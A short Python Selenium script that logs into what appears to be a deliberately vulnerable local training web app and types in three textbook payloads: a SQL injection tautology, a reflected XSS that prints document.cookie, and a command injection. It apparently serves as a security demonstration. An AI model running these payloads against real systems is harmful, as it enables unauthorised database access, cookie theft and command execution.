from selenium import webdriver
from time import sleep


class DemoProject:

    def __init__(self):
        self._driver = webdriver.Firefox()
        self._driver.get("http://localhost:7891/login.php")

    def automation(self):
        self._click_button("Login")
        self._click_button("Create / Reset Database")
        sleep(8)
        self._fill_input("username", "admin")
        self._fill_input("password", "password")
        self._click_button("Login")
        self._automate_attack("SQL Injection", "id", "' or '1' = '1")
        self._automate_attack("XSS (Reflected)", "name", "<script>document.write(document.cookie)</script>")
        self._automate_attack("Command Injection", "ip", "; pwd")

    def _click_button(self, input_value):
        login = self._driver.find_elements_by_xpath(f"//input[@value='{input_value}']")[0]
        login.click()

    def _click_link(self, link_name):
        self._driver.find_element_by_link_text(link_name).click()

    def _fill_input(self, input_name, input_text):
        input_field = self._driver.find_element_by_name(input_name)
        for character in input_text:
            input_field.send_keys(character)
            sleep(0.3)

    def _automate_attack(self, attack_link_name, attack_input_name, attack_content):
        self._click_link(attack_link_name)
        self._fill_input(attack_input_name, attack_content)
        sleep(1.5)
        self._click_button("Submit")
        sleep(3)


def main():
    automation = DemoProject()
    automation.automation()


if __name__ == "__main__":
    main()

